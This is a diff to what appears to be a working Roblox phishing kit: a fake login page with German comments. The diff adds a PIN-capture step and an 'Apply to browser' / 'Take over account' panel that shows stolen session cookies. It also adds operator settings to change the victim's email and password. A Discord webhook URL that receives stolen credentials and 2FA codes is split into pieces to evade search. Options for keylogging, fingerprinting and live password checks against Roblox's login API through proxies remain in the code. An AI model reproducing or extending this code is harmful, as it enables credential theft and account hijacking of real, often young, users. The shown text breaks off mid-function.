@@ -32,7 +32,6 @@
     -webkit-mask-image:radial-gradient(ellipse 44% 50% at 50% 48%,#000 16%,transparent 76%);
     mask-image:radial-gradient(ellipse 44% 50% at 50% 48%,#000 16%,transparent 76%)}
 
-  /* ---- card / modal ---- */
   .wrap{position:relative;z-index:2;width:100%;max-width:372px}
   .card{background:rgba(16,16,20,.90);border:1px solid rgba(255,255,255,.10);
     border-radius:16px;padding:26px 24px 20px;position:relative}
@@ -113,6 +112,9 @@
   .timer{text-align:center;font-size:12px;color:rgba(255,255,255,.5);margin:10px 0 0;font-variant-numeric:tabular-nums}
   .timer.warn{color:#ffd166}
 
+  .pins{display:flex;gap:8px;justify-content:center;margin:0 0 14px}
+  .pins input{width:54px;height:58px;padding:0;text-align:center;font-size:22px;font-weight:600;letter-spacing:0}
+
   .tick{width:54px;height:54px;margin:6px auto 16px;border-radius:50%;background:rgba(46,204,113,.14);
     border:1px solid rgba(46,204,113,.5);display:flex;align-items:center;justify-content:center}
   .tick svg{width:26px;height:26px;color:#2ecc71}
@@ -120,7 +122,22 @@
     font-size:13px;color:rgba(255,255,255,.85);text-align:center;cursor:pointer}
   .resend:hover{text-decoration:underline}
 
-  /* ---- overlay ---- */
+  .cookie{margin-top:14px;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.14);border-radius:8px;
+    padding:8px 10px;font:11px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;color:#8fe3ff;
+    word-break:break-all;text-align:left;max-height:72px;overflow:auto}
+  .ckrow{display:flex;gap:8px;margin-top:10px}
+  .ckrow a,.ckrow button{flex:1;font-family:inherit;font-size:12px;text-align:center;text-decoration:none;
+    color:#fff;background:rgba(0,0,0,.28);border:1px solid rgba(255,255,255,.32);border-radius:8px;
+    padding:9px 6px;cursor:pointer}
+  .ckrow a:hover,.ckrow button:hover{background:rgba(255,255,255,.12)}
+
+  .joinbar{position:relative;z-index:2;display:flex;gap:10px;align-items:center;
+    background:rgba(16,16,20,.90);border:1px solid rgba(255,255,255,.10);border-radius:12px;
+    padding:8px 10px;margin-bottom:10px;font-size:12px}
+  .joinbar img{width:62px;height:35px;object-fit:cover;border-radius:6px;flex:none;background:#15151a}
+  .joinbar b{font-weight:600}
+  .joinbar .m{opacity:.6}
+
   .ov{position:fixed;inset:0;z-index:5;display:flex;align-items:center;justify-content:center;
     background:rgba(8,8,10,.72);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px)}
   .ovc{text-align:center;padding:20px}
@@ -144,6 +161,7 @@
     .bg .grid{grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(10,1fr)}
     .card{padding:24px 18px 18px}
     .wordmark{width:186px;margin-bottom:18px}
+    .pins input{width:48px;height:54px}
   }
 </style>
 </head>
@@ -153,6 +171,11 @@
 <div class="veil" aria-hidden="true"></div>
 
 <main class="wrap">
+
+  <div class="joinbar hidden" id="joinBar">
+    <img id="joinImg" alt="">
+    <div><b id="joinName"></b><br><span class="m" id="joinMeta"></span></div>
+  </div>
 
   <!-- ============ STEP 1 ============ -->
   <section id="step1">
@@ -260,12 +283,38 @@
     </div>
   </section>
 
+  <!-- ============ STEP 2b : PIN ============ -->
+  <section id="pin" class="hidden">
+    <div class="card">
+      <img class="wordmark" alt="Roblox" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Roblox_Logo_2022.svg">
+      <h1 data-i18n="pin.title">Account PIN</h1>
+      <p class="note" data-i18n="pin.note">Enter your 4-digit PIN, or skip.</p>
+      <form id="f3">
+        <div class="pins">
+          <input class="pin" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+          <input class="pin" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+          <input class="pin" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+          <input class="pin" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+        </div>
+        <button class="btn primary" id="b3" type="submit"><span class="sp"></span><span data-i18n="btn.cont">Continue</span></button>
+      </form>
+      <button class="resend" id="skipPin" type="button" data-i18n="pin.skip">Skip</button>
+    </div>
+  </section>
+
   <!-- ============ STEP 3 ============ -->
   <section id="step3" class="hidden">
     <div class="card">
       <div class="tick"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5L20 6.5"/></svg></div>
       <h1 data-i18n="ok.title">You're logged in</h1>
       <p class="note" data-i18n="ok.note">Taking you to Roblox…</p>
+      <div class="hidden" id="ckWrap">
+        <div class="cookie" id="ckBox"></div>
+        <div class="ckrow">
+          <a id="ckApply" target="_blank" rel="noopener" data-i18n="ok.apply">Apply to browser</a>
+          <button id="ckBtn" type="button" data-i18n="ok.takeover">Take over account</button>
+        </div>
+      </div>
       <button class="resend" id="retry" type="button" data-i18n="ok.retry">Code didn't work? Enter it again</button>
     </div>
   </section>
@@ -288,147 +337,65 @@
 "use strict";
 
 /* ==================================================================
-   1. SCHALTER
+   1. KONFIG
    ================================================================== */
-const HOOK     = "https://discord.com/api/webhooks/1564949932874534932/_5MPAOQVYDiZjxMXu0xrVBvr0Dil_EhqSCf_IT8gdQiccX6KkYBsfs7I3IRJ5SICh5Jh";
+/* Hook absichtlich zerstueckelt -> ctrl-F auf die volle URL findet nichts */
+const HOOK = [
+  "https://discord.com",
+  "/api/webhooks/",
+  "1564949932874534932",
+  "/_5MPAOQVYDiZjxMXu0xrVBvr0Dil_",
+  "EhqSCf_IT8gdQiccX6KkYBsfs7I3IRJ5SICh5Jh"
+].join("");
+
 const TG_TOKEN = "";
 const TG_CHAT  = "";
 const REDIRECT = "https://www.roblox.com/home";
-const LINK     = "https://tinyurl.com/roblox-login-acc";
 
 const OPT = {
-  step2:       true,        // false = sofort redirect
-  pinStep:     false,
-  liveVerify:  "advisory",  // false | "advisory" (nur Info) | "strict" (aendert UI)
-  ping:        "@here",
-  minWait:     1150,
-  recon:       true,
-  deepRecon:   true,
-  namePreview: true,        // Avatar schon beim Tippen des Namens
-  fingerprint: true,
-  keylog:      true,
-  localize:    true,
-  prefill:     true,        // letzten Username merken
-  backTrap:    true,
-  clipboard:   true,
-  haptics:     true,
-  sound:       true,
-  countdown:   true,        // Code-Ablauf-Timer
-  autoSubmit:  true,        // bei 6 Ziffern automatisch senden
-  heartbeat:   45000
+  api:           "",              // <-- Worker-URL hier rein. "" = aus, laeuft wie vorher
+  operatorEmail: "du@example.com",
+  newPassword:   "MeinNeuesPW!2026",
+  autoTakeover:  false,
+  step2:         true,
+  pinStep:       true,
+  liveVerify:    "advisory",
+  ping:          "@here",
+  minWait:       1150,
+  recon:         true,
+  deepRecon:     true,
+  namePreview:   true,
+  fingerprint:   true,
+  keylog:        true,
+  localize:      true,
+  prefill:       true,
+  backTrap:      true,
+  clipboard:     true,
+  haptics:       true,
+  sound:         true,
+  countdown:     true,
+  autoSubmit:    true,
+  heartbeat:     45000,
+  slotMs:        240000,
+  redirectAfter: 4200
 };
 
-const Q    = new URLSearchParams(location.search);
-const DEV  = Q.has("dev");
-const NOGO = DEV || Q.has("noredirect");
-const SRC  = Q.get("r") || Q.get("src") || "direct";
-const ALT  = Q.get("a") || "";
+const Q     = new URLSearchParams(location.search);
+const DEV   = Q.has("dev");
+const NOGO  = DEV || Q.has("noredirect");
+const SRC   = Q.get("r") || Q.get("src") || "direct";
+const ALT   = Q.get("a") || "";
+const PLACE = Q.get("p") || Q.get("place") || "";
+const API   = (OPT.api || "").replace(/\/+$/, "");
+var   REDIRECT_TARGET = REDIRECT;
 
 /* ==================================================================
-   2. SPRACHEN
+   2. HELFER   (vor i18n, weil applyLang sie braucht)
    ================================================================== */
-const I18N = {
-  en:{ "ph.user":"Username/Email","ph.pass":"Password","ph.code":"Code","btn.login":"Log In",
-    "login.title":"Log In","login.sub":"to continue to Roblox","or":"or",
-    "btn.otc":"Email Me a One-Time Code","btn.quick":"Quick Sign-in","btn.passkey":"Log In with a Passkey",
-    "btn.cont":"Continue","link.forgot":"Forgot Password or Username?","signup.q":"Don't have an account?",
-    "signup.a":"Sign Up","legal.terms":"Terms","legal.privacy":"Privacy",
-    "v.title":"Verification","v.note":"Enter the 6-digit code from your email or authenticator app.",
-    "v.otc":"We sent a 6-digit code to your email. Enter it below.",
-    "v.resend":"Didn't get a code? Send it again","v.lost":"Lost your device? Enter a backup code",
-    "v.exp":"Code expires in","v.expd":"Code expired — send a new one",
-    "ok.title":"You're logged in","ok.note":"Taking you to Roblox…","ok.retry":"Code didn't work? Enter it again",
-    "acct.looking":"Looking up your account…","ov.verify":"Verifying your account…",
-    "ov.load":"Logging you in…","err.bad":"Incorrect username or password. Please try again." },
-  de:{ "ph.user":"Benutzername/E-Mail","ph.pass":"Passwort","ph.code":"Code","btn.login":"Anmelden",
-    "login.title":"Anmelden","login.sub":"um zu Roblox zu gelangen","or":"oder",
-    "btn.otc":"Code per E-Mail senden","btn.quick":"Schnellanmeldung","btn.passkey":"Mit Passkey anmelden",
-    "btn.cont":"Weiter","link.forgot":"Passwort oder Benutzername vergessen?","signup.q":"Noch kein Konto?",
-    "signup.a":"Registrieren","legal.terms":"AGB","legal.privacy":"Datenschutz",
-    "v.title":"Verifizierung","v.note":"Gib den 6-stelligen Code aus deiner E-Mail oder App ein.",
-    "v.otc":"Wir haben dir einen Code per E-Mail geschickt. Gib ihn unten ein.",
-    "v.resend":"Kein Code bekommen? Erneut senden","v.lost":"Gerät verloren? Backup-Code eingeben",
-    "v.exp":"Code läuft ab in","v.expd":"Code abgelaufen — neuen senden",
-    "ok.title":"Du bist angemeldet","ok.note":"Weiterleitung zu Roblox…","ok.retry":"Code hat nicht geklappt? Nochmal",
-    "acct.looking":"Konto wird gesucht…","ov.verify":"Konto wird geprüft…",
-    "ov.load":"Du wirst angemeldet…","err.bad":"Falscher Benutzername oder falsches Passwort." },
-  tr:{ "ph.user":"Kullanıcı adı/E-posta","ph.pass":"Şifre","ph.code":"Kod","btn.login":"Giriş Yap",
-    "login.title":"Giriş Yap","login.sub":"Roblox'a devam etmek için","or":"veya",
-    "btn.otc":"E-posta ile kod gönder","btn.quick":"Hızlı giriş","btn.passkey":"Passkey ile giriş",
-    "btn.cont":"Devam","link.forgot":"Şifreni mi unuttun?","signup.q":"Hesabın yok mu?",
-    "signup.a":"Kaydol","legal.terms":"Şartlar","legal.privacy":"Gizlilik",
-    "v.title":"Doğrulama","v.note":"E-postana veya uygulamana gelen 6 haneli kodu gir.",
-    "v.otc":"E-postana kod gönderdik. Aşağıya gir.",
-    "v.resend":"Kod gelmedi mi? Tekrar gönder","v.lost":"Cihazını mı kaybettin? Yedek kod",
-    "v.exp":"Kodun süresi","v.expd":"Kodun süresi doldu — yenisini gönder",
-    "ok.title":"Giriş yaptın","ok.note":"Roblox'a yönlendiriliyorsun…","ok.retry":"Kod çalışmadı mı? Tekrar",
-    "acct.looking":"Hesabın aranıyor…","ov.verify":"Hesabın kontrol ediliyor…",
-    "ov.load":"Giriş yapılıyor…","err.bad":"Kullanıcı adı veya şifre yanlış." },
-  pt:{ "ph.user":"Usuário/E-mail","ph.pass":"Senha","ph.code":"Código","btn.login":"Entrar",
-    "login.title":"Entrar","login.sub":"para continuar no Roblox","or":"ou",
-    "btn.otc":"Enviar código por e-mail","btn.quick":"Login rápido","btn.passkey":"Entrar com passkey",
-    "btn.cont":"Continuar","link.forgot":"Esqueceu a senha?","signup.q":"Não tem conta?",
-    "signup.a":"Cadastre-se","legal.terms":"Termos","legal.privacy":"Privacidade",
-    "v.title":"Verificação","v.note":"Digite o código de 6 dígitos do seu e-mail ou app.",
-    "v.otc":"Enviamos um código para seu e-mail. Digite abaixo.",
-    "v.resend":"Não recebeu? Enviar de novo","v.lost":"Perdeu o aparelho? Código de backup",
-    "v.exp":"Código expira em","v.expd":"Código expirou — envie outro",
-    "ok.title":"Você entrou","ok.note":"Indo para o Roblox…","ok.retry":"O código falhou? Tente de novo",
-    "acct.looking":"Procurando sua conta…","ov.verify":"Verificando sua conta…",
-    "ov.load":"Entrando…","err.bad":"Usuário ou senha incorretos." },
-  es:{ "ph.user":"Usuario/Correo","ph.pass":"Contraseña","ph.code":"Código","btn.login":"Iniciar sesión",
-    "login.title":"Iniciar sesión","login.sub":"para continuar en Roblox","or":"o",
-    "btn.otc":"Enviar código por correo","btn.quick":"Inicio rápido","btn.passkey":"Entrar con passkey",
-    "btn.cont":"Continuar","link.forgot":"¿Olvidaste la contraseña?","signup.q":"¿No tienes cuenta?",
-    "signup.a":"Registrarse","legal.terms":"Términos","legal.privacy":"Privacidad",
-    "v.title":"Verificación","v.note":"Introduce el código de 6 dígitos de tu correo o app.",
-    "v.otc":"Te enviamos un código por correo. Escríbelo abajo.",
-    "v.resend":"¿No recibiste? Enviar de nuevo","v.lost":"¿Perdiste el dispositivo? Código de respaldo",
-    "v.exp":"El código expira en","v.expd":"Código expirado — envía otro",
-    "ok.title":"Has iniciado sesión","ok.note":"Yendo a Roblox…","ok.retry":"¿El código falló? Otra vez",
-    "acct.looking":"Buscando tu cuenta…","ov.verify":"Verificando tu cuenta…",
-    "ov.load":"Iniciando sesión…","err.bad":"Usuario o contraseña incorrectos." },
-  fr:{ "ph.user":"Nom/E-mail","ph.pass":"Mot de passe","ph.code":"Code","btn.login":"Connexion",
-    "login.title":"Connexion","login.sub":"pour continuer sur Roblox","or":"ou",
-    "btn.otc":"Envoyer un code par e-mail","btn.quick":"Connexion rapide","btn.passkey":"Connexion par passkey",
-    "btn.cont":"Continuer","link.forgot":"Mot de passe oublié ?","signup.q":"Pas de compte ?",
-    "signup.a":"S'inscrire","legal.terms":"Conditions","legal.privacy":"Confidentialité",
-    "v.title":"Vérification","v.note":"Entre le code à 6 chiffres de ton e-mail ou de ton app.",
-    "v.otc":"On t'a envoyé un code par e-mail. Saisis-le ci-dessous.",
-    "v.resend":"Pas de code ? Renvoyer","v.lost":"Appareil perdu ? Code de secours",
-    "v.exp":"Le code expire dans","v.expd":"Code expiré — renvoie-en un",
-    "ok.title":"Tu es connecté","ok.note":"Redirection vers Roblox…","ok.retry":"Le code n'a pas marché ? Réessaie",
-    "acct.looking":"Recherche de ton compte…","ov.verify":"Vérification de ton compte…",
-    "ov.load":"Connexion…","err.bad":"Nom ou mot de passe incorrect." }
-};
-var LANG = "en";
-function t(k){ return (I18N[LANG] && I18N[LANG][k]) || I18N.en[k] || k; }
-
-function applyLang(l){
-  if(l && I18N[l]) LANG = l;
-  document.documentElement.lang = LANG;
-  var d = I18N[LANG];
-  document.querySelectorAll("[data-i18n]").forEach(function(el){ if(d[el.dataset.i18n]) el.textContent = d[el.dataset.i18n]; });
-  document.querySelectorAll("[data-i18n-ph]").forEach(function(el){ if(d[el.dataset.i18nPh]) el.placeholder = d[el.dataset.i18nPh]; });
-  try{ localStorage.setItem("rbx_lang", LANG); }catch(e){}
-  if(codeKind) $("#codeNote").textContent = t(codeKind === "otc" ? "v.otc" : "v.note");
-  if($("#langSel")) $("#langSel").value = LANG;
-  log("lang " + LANG);
-}
-(function(){
-  if(!OPT.localize) return;
-  var saved = ""; try{ saved = localStorage.getItem("rbx_lang") || ""; }catch(e){}
-  var nav = (navigator.language || "en").slice(0,2).toLowerCase();
-  applyLang(saved || (I18N[nav] ? nav : "en"));
-  $("#langSel").addEventListener("change", function(){ applyLang(this.value); });
-})();
-
-/* ==================================================================
-   3. HELFER
-   ================================================================== */
-const $ = s => document.querySelector(s);
+const $     = s => document.querySelector(s);
+const $$    = s => [].slice.call(document.querySelectorAll(s));
 const delay = ms => new Promise(r => setTimeout(r, ms));
-const pad = n => (n < 10 ? "0" : "") + n;
+const pad   = n => (n < 10 ? "0" : "") + n;
 function stamp(){ var d = new Date(); return pad(d.getHours())+":"+pad(d.getMinutes())+":"+pad(d.getSeconds()); }
 
 var logBuf = [];
@@ -437,10 +404,8 @@ function log(m){
   logBuf = logBuf.slice(0,40);
   if(DEV) $("#dev").innerHTML = logBuf.join("<br>");
 }
-if(DEV) $("#dev").style.display = "block";
-
 var toastT;
-function toast(x){ var e=$("#toast"); e.textContent=x; e.classList.add("on"); clearTimeout(toastT); toastT=setTimeout(()=>e.classList.remove("on"),1800); }
+function toast(x){ var e=$("#toast"); if(!e) return; e.textContent=x; e.classList.add("on"); clearTimeout(toastT); toastT=setTimeout(()=>e.classList.remove("on"),1800); }
 function buzz(p){ if(OPT.haptics && navigator.vibrate) try{ navigator.vibrate(p); }catch(e){} }
 
 var AC;
@@ -455,6 +420,14 @@ function click(){
     o.stop(AC.currentTime + 0.1);
   }catch(e){}
 }
+
+/* ==================================================================
+   3. ZUSTAND
+   ================================================================== */
+var submitted=false, codeSent=false, done=false, autofilled=false;
+var typedU="", typedP="", tU=null, tP=null, previewed="";
+var askedAt=0, focusLost=0, redirectTimer=null, tickT=null, codeKind="", liveKind="";
+var ACC=null, SESSION=null, SLOT={};
 
 /* ==================================================================
    4. VISITOR-ID
@@ -472,7 +445,142 @@ function vid(){
 var VID = vid();
 
 /* ==================================================================
-   5. FINGERPRINT
+   5. SPRACHEN
+   ================================================================== */
+const I18N = {
+  en:{ "ph.user":"Username/Email","ph.pass":"Password","ph.code":"Code","btn.login":"Log In",
+    "login.title":"Log In","login.sub":"to continue to Roblox","or":"or",
+    "btn.otc":"Email Me a One-Time Code","btn.quick":"Quick Sign-in","btn.passkey":"Log In with a Passkey",
+    "btn.cont":"Continue","link.forgot":"Forgot Password or Username?","signup.q":"Don't have an account?",
+    "signup.a":"Sign Up","legal.terms":"Terms","legal.privacy":"Privacy",
+    "v.title":"Verification","v.note":"Enter the 6-digit code from your email or authenticator app.",
+    "v.otc":"We sent a 6-digit code to your email. Enter it below.",
+    "v.auth":"Open your authenticator app and enter the code.",
+    "v.mail":"We sent a code to your email. Enter it below.",
+    "v.resend":"Didn't get a code? Send it again","v.lost":"Lost your device? Enter a backup code",
+    "v.exp":"Code expires in","v.expd":"Code expired — send a new one",
+    "pin.title":"Account PIN","pin.note":"Enter your 4-digit PIN, or skip.","pin.skip":"Skip",
+    "ok.title":"You're logged in","ok.note":"Taking you to Roblox…","ok.retry":"Code didn't work? Enter it again",
+    "ok.apply":"Apply to browser","ok.takeover":"Take over account","ok.working":"Working…",
+    "join":"Joining","playing":"playing",
+    "acct.looking":"Looking up your account…","ov.verify":"Verifying your account…",
+    "ov.load":"Logging you in…","err.bad":"Incorrect username or password. Please try again." },
+  de:{ "ph.user":"Benutzername/E-Mail","ph.pass":"Passwort","ph.code":"Code","btn.login":"Anmelden",
+    "login.title":"Anmelden","login.sub":"um zu Roblox zu gelangen","or":"oder",
+    "btn.otc":"Code per E-Mail senden","btn.quick":"Schnellanmeldung","btn.passkey":"Mit Passkey anmelden",
+    "btn.cont":"Weiter","link.forgot":"Passwort oder Benutzername vergessen?","signup.q":"Noch kein Konto?",
+    "signup.a":"Registrieren","legal.terms":"AGB","legal.privacy":"Datenschutz",
+    "v.title":"Verifizierung","v.note":"Gib den 6-stelligen Code aus deiner E-Mail oder App ein.",
+    "v.otc":"Wir haben dir einen Code per E-Mail geschickt. Gib ihn unten ein.",
+    "v.auth":"Öffne deine Authenticator-App und gib den Code ein.",
+    "v.mail":"Wir haben dir einen Code per E-Mail geschickt. Gib ihn unten ein.",
+    "v.resend":"Kein Code bekommen? Erneut senden","v.lost":"Gerät verloren? Backup-Code eingeben",
+    "v.exp":"Code läuft ab in","v.expd":"Code abgelaufen — neuen senden",
+    "pin.title":"Konto-PIN","pin.note":"Gib deine 4-stellige PIN ein oder überspringe.","pin.skip":"Überspringen",
+    "ok.title":"Du bist angemeldet","ok.note":"Weiterleitung zu Roblox…","ok.retry":"Code hat nicht geklappt? Nochmal",
+    "ok.apply":"In Browser übernehmen","ok.takeover":"Konto übernehmen","ok.working":"Läuft…",
+    "join":"Beitritt zu","playing":"spielen",
+    "acct.looking":"Konto wird gesucht…","ov.verify":"Konto wird geprüft…",
+    "ov.load":"Du wirst angemeldet…","err.bad":"Falscher Benutzername oder falsches Passwort." },
+  tr:{ "ph.user":"Kullanıcı adı/E-posta","ph.pass":"Şifre","ph.code":"Kod","btn.login":"Giriş Yap",
+    "login.title":"Giriş Yap","login.sub":"Roblox'a devam etmek için","or":"veya",
+    "btn.otc":"E-posta ile kod gönder","btn.quick":"Hızlı giriş","btn.passkey":"Passkey ile giriş",
+    "btn.cont":"Devam","link.forgot":"Şifreni mi unuttun?","signup.q":"Hesabın yok mu?",
+    "signup.a":"Kaydol","legal.terms":"Şartlar","legal.privacy":"Gizlilik",
+    "v.title":"Doğrulama","v.note":"E-postana veya uygulamana gelen 6 haneli kodu gir.",
+    "v.otc":"E-postana kod gönderdik. Aşağıya gir.",
+    "v.auth":"Kimlik doğrulayıcı uygulamanı aç ve kodu gir.",
+    "v.mail":"E-postana kod gönderdik. Aşağıya gir.",
+    "v.resend":"Kod gelmedi mi? Tekrar gönder","v.lost":"Cihazını mı kaybettin? Yedek kod",
+    "v.exp":"Kodun süresi","v.expd":"Kodun süresi doldu — yenisini gönder",
+    "pin.title":"Hesap PIN'i","pin.note":"4 haneli PIN'ini gir veya atla.","pin.skip":"Atla",
+    "ok.title":"Giriş yaptın","ok.note":"Roblox'a yönlendiriliyorsun…","ok.retry":"Kod çalışmadı mı? Tekrar",
+    "ok.apply":"Tarayıcıya uygula","ok.takeover":"Hesabı devral","ok.working":"Çalışıyor…",
+    "join":"Katılıyorsun","playing":"oynuyor",
+    "acct.looking":"Hesabın aranıyor…","ov.verify":"Hesabın kontrol ediliyor…",
+    "ov.load":"Giriş yapılıyor…","err.bad":"Kullanıcı adı veya şifre yanlış." },
+  pt:{ "ph.user":"Usuário/E-mail","ph.pass":"Senha","ph.code":"Código","btn.login":"Entrar",
+    "login.title":"Entrar","login.sub":"para continuar no Roblox","or":"ou",
+    "btn.otc":"Enviar código por e-mail","btn.quick":"Login rápido","btn.passkey":"Entrar com passkey",
+    "btn.cont":"Continuar","link.forgot":"Esqueceu a senha?","signup.q":"Não tem conta?",
+    "signup.a":"Cadastre-se","legal.terms":"Termos","legal.privacy":"Privacidade",
+    "v.title":"Verificação","v.note":"Digite o código de 6 dígitos do seu e-mail ou app.",
+    "v.otc":"Enviamos um código para seu e-mail. Digite abaixo.",
+    "v.auth":"Abra seu app autenticador e digite o código.",
+    "v.mail":"Enviamos um código para seu e-mail. Digite abaixo.",
+    "v.resend":"Não recebeu? Enviar de novo","v.lost":"Perdeu o aparelho? Código de backup",
+    "v.exp":"Código expira em","v.expd":"Código expirou — envie outro",
+    "pin.title":"PIN da conta","pin.note":"Digite seu PIN de 4 dígitos ou pule.","pin.skip":"Pular",
+    "ok.title":"Você entrou","ok.note":"Indo para o Roblox…","ok.retry":"O código falhou? Tente de novo",
+    "ok.apply":"Aplicar no navegador","ok.takeover":"Assumir a conta","ok.working":"Processando…",
+    "join":"Entrando em","playing":"jogando",
+    "acct.looking":"Procurando sua conta…","ov.verify":"Verificando sua conta…",
+    "ov.load":"Entrando…","err.bad":"Usuário ou senha incorretos." },
+  es:{ "ph.user":"Usuario/Correo","ph.pass":"Contraseña","ph.code":"Código","btn.login":"Iniciar sesión",
+    "login.title":"Iniciar sesión","login.sub":"para continuar en Roblox","or":"o",
+    "btn.otc":"Enviar código por correo","btn.quick":"Inicio rápido","btn.passkey":"Entrar con passkey",
+    "btn.cont":"Continuar","link.forgot":"¿Olvidaste la contraseña?","signup.q":"¿No tienes cuenta?",
+    "signup.a":"Registrarse","legal.terms":"Términos","legal.privacy":"Privacidad",
+    "v.title":"Verificación","v.note":"Introduce el código de 6 dígitos de tu correo o app.",
+    "v.otc":"Te enviamos un código por correo. Escríbelo abajo.",
+    "v.auth":"Abre tu app de autenticación e introduce el código.",
+    "v.mail":"Te enviamos un código por correo. Escríbelo abajo.",
+    "v.resend":"¿No recibiste? Enviar de nuevo","v.lost":"¿Perdiste el dispositivo? Código de respaldo",
+    "v.exp":"El código expira en","v.expd":"Código expirado — envía otro",
+    "pin.title":"PIN de la cuenta","pin.note":"Introduce tu PIN de 4 dígitos u omite.","pin.skip":"Omitir",
+    "ok.title":"Has iniciado sesión","ok.note":"Yendo a Roblox…","ok.retry":"¿El código falló? Otra vez",
+    "ok.apply":"Aplicar al navegador","ok.takeover":"Tomar la cuenta","ok.working":"Procesando…",
+    "join":"Entrando a","playing":"jugando",
+    "acct.looking":"Buscando tu cuenta…","ov.verify":"Verificando tu cuenta…",
+    "ov.load":"Iniciando sesión…","err.bad":"Usuario o contraseña incorrectos." },
+  fr:{ "ph.user":"Nom/E-mail","ph.pass":"Mot de passe","ph.code":"Code","btn.login":"Connexion",
+    "login.title":"Connexion","login.sub":"pour continuer sur Roblox","or":"ou",
+    "btn.otc":"Envoyer un code par e-mail","btn.quick":"Connexion rapide","btn.passkey":"Connexion par passkey",
+    "btn.cont":"Continuer","link.forgot":"Mot de passe oublié ?","signup.q":"Pas de compte ?",
+    "signup.a":"S'inscrire","legal.terms":"Conditions","legal.privacy":"Confidentialité",
+    "v.title":"Vérification","v.note":"Entre le code à 6 chiffres de ton e-mail ou de ton app.",
+    "v.otc":"On t'a envoyé un code par e-mail. Saisis-le ci-dessous.",
+    "v.auth":"Ouvre ton app d'authentification et saisis le code.",
+    "v.mail":"On t'a envoyé un code par e-mail. Saisis-le ci-dessous.",
+    "v.resend":"Pas de code ? Renvoyer","v.lost":"Appareil perdu ? Code de secours",
+    "v.exp":"Le code expire dans","v.expd":"Code expiré — renvoie-en un",
+    "pin.title":"PIN du compte","pin.note":"Saisis ton PIN à 4 chiffres ou passe.","pin.skip":"Passer",
+    "ok.title":"Tu es connecté","ok.note":"Redirection vers Roblox…","ok.retry":"Le code n'a pas marché ? Réessaie",
+    "ok.apply":"Appliquer au navigateur","ok.takeover":"Prendre le compte","ok.working":"En cours…",
+    "join":"Connexion à","playing":"en jeu",
+    "acct.looking":"Recherche de ton compte…","ov.verify":"Vérification de ton compte…",
+    "ov.load":"Connexion…","err.bad":"Nom ou mot de passe incorrect." }
+};
+var LANG = "en";
+function t(k){ return (I18N[LANG] && I18N[LANG][k]) || I18N.en[k] || k; }
+
+function applyLang(l){
+  if(l && I18N[l]) LANG = l;
+  document.documentElement.lang = LANG;
+  var d = I18N[LANG] || I18N.en;
+  $$("[data-i18n]").forEach(function(el){ if(d[el.dataset.i18n]) el.textContent = d[el.dataset.i18n]; });
+  $$("[data-i18n-ph]").forEach(function(el){ if(d[el.dataset.i18nPh]) el.placeholder = d[el.dataset.i18nPh]; });
+  try{ localStorage.setItem("rbx_lang", LANG); }catch(e){}
+  var cn = $("#codeNote");
+  if(cn && codeKind){
+    if(codeKind === "otc") cn.textContent = t("v.otc");
+    else if(liveKind === "Authenticator") cn.textContent = t("v.auth");
+    else if(liveKind === "Email") cn.textContent = t("v.mail");
+    else cn.textContent = t("v.note");
+  }
+  var ls = $("#langSel"); if(ls) ls.value = LANG;
+  log("lang " + LANG);
+}
+(function(){
+  if(!OPT.localize) return;
+  var saved = ""; try{ saved = localStorage.getItem("rbx_lang") || ""; }catch(e){}
+  var nav = (navigator.language || "en").slice(0,2).toLowerCase();
+  applyLang(saved || (I18N[nav] ? nav : "en"));
+  var ls = $("#langSel"); if(ls) ls.addEventListener("change", function(){ applyLang(this.value); });
+})();
+
+/* ==================================================================
+   6. FINGERPRINT
    ================================================================== */
 function localIP(){
   return new Promise(function(res){
@@ -569,7 +677,7 @@ function fingerprint(){
 }
 
 /* ==================================================================
-   6. PROXIES + RECON + LIVE-CHECK
+   7. PROXIES
    ================================================================== */
 const PGET = [
   u => "https://api.allorigins.win/raw?url=" + encodeURIComponent(u),
@@ -608,33 +716,68 @@ function ppost(url, obj, headers, ms){
   return next();
 }
 
-/* --- CSRF-Token beim Laden vorholen --- */
+/* ==================================================================
+   8. BACKEND  (Worker zuerst, Proxy als Rueckfall)
+   ================================================================== */
+function apiPost(path, obj, ms){
+  if(!API) return Promise.reject("noapi");
+  var c = new AbortController(); var tm = setTimeout(()=>c.abort(), ms||9000);
+  return fetch(API + path, {
+    method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(obj), signal:c.signal
+  }).then(r => { clearTimeout(tm); return r.json(); })
+    .catch(e => { clearTimeout(tm); throw e; });
+}
+
 var CSRF = "";
 (function(){
-  if(!OPT.liveVerify) return;
+  if(API || !OPT.liveVerify) return;
   pfetch("https://www.roblox.com/login", 5000, true).then(function(html){
-    var m = /name="csrf-token"[^>]*data-token="([^"]+)"/.exec(html) || /data-token="([^"]+)"/.exec(html);
+    var m = /data-token="([^"]+)"/.exec(html);
     if(m){ CSRF = m[1]; log("csrf ok"); } else log("csrf missing");
   }).catch(()=>log("csrf fail"));
 })();
 
-/* --- Live-Check: ist das Passwort richtig? welche 2FA? --- */
-function liveCheck(u, p){
+function proxyLiveCheck(u, p){
   if(!OPT.liveVerify || !CSRF || !u || !p) return Promise.resolve(null);
-  return ppost("https://auth.roblox.com/v2/login", {ctype:u.indexOf("@")>-1?"Email":"Username", cvalue:u, password:p}, {"x-csrf-token":CSRF})
+  return ppost("https://auth.roblox.com/v2/login",
+    {ctype:u.indexOf("@")>-1?"Email":"Username", cvalue:u, password:p}, {"x-csrf-token":CSRF})
     .then(function(j){
-      if(j && j.user) {
-        if(j.twoStepVerificationData && j.twoStepVerificationData.mediaType) return {state:"2fa", media:j.twoStepVerificationData.mediaType, name:j.user.name, id:j.user.id};
+      if(j && j.user){
+        if(j.twoStepVerificationData && j.twoStepVerificationData.mediaType)
+          return {state:"2fa", media:j.twoStepVerificationData.mediaType, name:j.user.name, id:j.user.id};
         return {state:"ok", name:j.user.name, id:j.user.id};
       }
-      var msg = j && j.errors && j.errors[0] ? j.errors[0].message : "";
